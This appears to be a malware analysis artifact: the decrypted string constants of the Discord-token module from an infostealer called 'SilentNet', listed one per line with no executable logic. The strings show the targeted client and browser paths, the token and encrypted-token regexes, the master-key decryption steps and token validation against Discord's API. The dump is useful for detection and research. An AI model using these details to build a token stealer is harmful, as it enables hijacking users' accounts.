"""
SilentNet Infostealer - Decompiled Module
Module: .app.handlers.discord
Chunk size: 3962 bytes
String constants: 69 unicode, 190 identifiers

# Discord token extraction and validation
# Original path: app/handlers/discord.py
"""

# ============================================================
# RECONSTRUCTED FROM NUITKA CONSTANT POOL
# Method: Rolling XOR + substitution cipher decryption
# All string literals, SQL queries, paths, and identifiers
# are authentic - extracted directly from compiled binary.
# ============================================================

# --- STRING CONSTANTS (in order of appearance) ---

# identifier: name
# identifier: db_path
# identifier: type
# identifier: environ
# identifier: get
# identifier: APPDATA
# identifier: LOCALAPPDATA
# identifier: DiscordClient
# identifier: Discord
# identifier: join
# identifier: discord
# identifier: DiscordClientType
# identifier: ENCRYPTED
'Discord PTB'
# identifier: discordptb
'Discord Canary'
# identifier: discordcanary
# identifier: Lightcord
# identifier: UNENCRYPTED
# identifier: Opera
'Opera Software'
'Opera Stable'
# identifier: BROWSER
'Opera GX'
'Opera GX Stable'
'Chrome SxS'
# identifier: Google
'User Data'
'Google Chrome'
# identifier: Chrome
'Microsoft Edge'
# identifier: Microsoft
# identifier: Edge
# identifier: Brave
# identifier: BraveSoftware
'Brave-Browser'
# identifier: Yandex
# identifier: YandexBrowser
# identifier: Vivaldi
'Get list of Discord clients to check (same as Java).'
# identifier: __enter__
# identifier: __exit__
# identifier: read
# identifier: finditer
# identifier: content
# identifier: group
# identifier: results
'Read file and extract all regex matches.'
# identifier: path
# identifier: tokens
# identifier: _regex_file
# identifier: TOKEN_REGEX
'Get unencrypted tokens from leveldb directory.'
# identifier: LoggingManager
# identifier: add
# identifier: _MODULE
'Getting encrypted tokens'
# identifier: LogType
# identifier: DEBUG
'Path: '
'Path does not exist'
# identifier: WARN
'Local State'
'Local State missing'
'Directory exists but Local State file missing'
'Local State found'
# identifier: get_browser_dpapi_master_key
'No master key'
# identifier: ERROR
'Could not retrieve master key'
'Master key retrieved'
'Key length: '
# identifier: ENCRYPTED_TOKEN_REGEX
# identifier: base64
# identifier: b64decode
# identifier: replace
'dQw4w9WgXcQ:'
# identifier: gcm_decrypt
# identifier: master_key
# identifier: decode
'utf-8'
'Token decrypt failed'
'Could not decrypt an encrypted token'
'Get encrypted tokens failed'
'Get encrypted tokens from leveldb directory and decrypt them.'
# identifier: Authorization
'Content-Type'
'application/json'
'User-Agent'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
# identifier: requests
'https://discord.com/api/v9/users/@me'
# identifier: headers
# identifier: timeout
# identifier: ok
# identifier: json
# identifier: username
# identifier: discriminator
'Not linked'
# identifier: phone
# identifier: premium_type
# identifier: id
# identifier: id
# identifier: username
# identifier: displayName
# identifier: email
# identifier: phone
# identifier: hasNitro
'Get token info failed'
'Validate token and get user info from Discord API.'
# identifier: inner
'get_discord_tokens.<locals>.inner'
'Starting token collection'
# identifier: INFO
'Beginning Discord token collection'
# identifier: ThreadPoolExecutor
# identifier: max_workers
# identifier: submit
# identifier: result
# identifier: _TIMEOUT
# identifier: timeout
# identifier: FuturesTimeoutError
# identifier: trace
'Exceeded '
's timeout'
'd.ex'
'Token collection failed'
'Collect all Discord tokens from all clients. Returns list of token info dicts.'
# identifier: scan
# identifier: _get_discord_clients
'Checking client'
'Checking for tokens in '
'Local Storage'
# identifier: leveldb
# identifier: _get_encrypted_tokens
# identifier: _get_unencrypted_tokens
# identifier: get_browser_profiles
# identifier: client
# identifier: tokens_to_add
'Tokens found'
'Found '
' token(s) for '
'Failed to get tokens for '
'Duplicates removed'
'Removed '
' duplicate tokens'
# identifier: _get_token_info
# identifier: token_info_list
'Invalid tokens removed'
' invalid/expired tokens'
# identifier: d9
'Collected '
' valid tokens with user info'
# identifier: __doc__
# identifier: __file__
# identifier: origin
# identifier: has_location
# identifier: __cached__
# identifier: os
# identifier: re
'concurrent.futures'
# identifier: ThreadPoolExecutor
# identifier: TimeoutError
# identifier: TimeoutError
# identifier: enum
# identifier: Enum
# identifier: Enum
# identifier: trace
# identifier: logging
# identifier: LoggingManager
# identifier: LogType
# identifier: util
# identifier: get_browser_dpapi_master_key
# identifier: gcm_decrypt
# identifier: get_browser_profiles
# identifier: compile
'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
'dQw4w9WgXcQ:[^\\"]*'
# identifier: __prepare__
# identifier: __getitem__
'%s.__prepare__() must return a mapping, not %s'
# identifier: __name__
'<metaclass>'
# identifier: __module__
# identifier: __qualname__
# identifier: encrypted
# identifier: unencrypted
# identifier: browser
# identifier: __orig_bases__
# identifier: client_type
# identifier: __init__
'DiscordClient.__init__'
# identifier: return
# identifier: pattern
# identifier: Pattern
# identifier: file_path
# identifier: path
# identifier: return
# identifier: token
# identifier: return
# identifier: return
# identifier: get_discord_tokens
'app\\handlers\\discord.py'
'<module app.handlers.discord>'
# identifier: __class__
# identifier: self
# identifier: name
# identifier: db_path
# identifier: client_type
# identifier: appdata
# identifier: localappdata
# identifier: path
# identifier: local_state_path
# identifier: master_key
# identifier: tokens
# identifier: filename
# identifier: file_path
# identifier: encrypted_token
# identifier: encrypted_data
# identifier: decrypted
# identifier: headers
# identifier: resp
# identifier: data
# identifier: username
# identifier: discriminator
# identifier: email
# identifier: phone
# identifier: has_nitro
# identifier: display_name
# identifier: tokens
# identifier: filename
# identifier: file_path
# identifier: pattern
# identifier: file_path
# identifier: results
# identifier: match
# identifier: token
# identifier: inner
# identifier: executor
# identifier: future
# identifier: clients
# identifier: client
# identifier: tokens_to_add
# identifier: leveldb_path
# identifier: profiles
# identifier: profile
# identifier: removed_count
# identifier: token_info_list
# identifier: token
# identifier: info
# identifier: __spec__
